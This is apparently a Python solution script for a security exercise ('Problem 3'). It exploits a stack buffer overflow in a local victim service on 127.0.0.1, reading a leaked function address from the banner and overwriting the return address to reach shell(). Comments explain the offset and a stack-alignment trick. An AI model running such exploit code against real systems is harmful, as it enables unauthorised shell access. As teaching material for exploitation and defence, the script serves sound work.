#!/usr/bin/python3
# Problem 3 -- overflow the victim service and divert control to shell().
#
# Offset to the saved return address of vulnerable() is 40 (buf[20] + padding
# + saved rbp), measured with gdb on this build.
#
# &shell is leaked by the program itself, so PIE/ASLR does not protect it.
# We jump to shell+1 (one byte past "push %rbp"): on modern glibc this flips
# the 16-byte stack alignment so the movaps inside system()/do_system() does
# not fault. Jumping to &shell directly reaches shell() too, but crashes in
# do_system() because the stack is misaligned by 8.

import telnetlib, re, time, sys

HOST, PORT = "127.0.0.1", 60000
OFFSET = 40

tn = telnetlib.Telnet(HOST, PORT)
time.sleep(0.4)
banner = tn.read_very_eager()
sys.stdout.write(banner.decode(errors="replace"))

m = re.search(rb"&shell = (0x[0-9a-f]+)", banner)
shell = int(m.group(1), 16)
target = shell + 1                     # +1 skips "push %rbp" -> realign stack

buff = OFFSET * b"x"
addr = bytearray((target).to_bytes(6, "little"))   # 6 low bytes; strcpy adds NUL
buff += addr

tn.write(buff + b"\n")
time.sleep(1.5)
sys.stdout.write(tn.read_very_eager().decode(errors="replace"))
tn.interact()
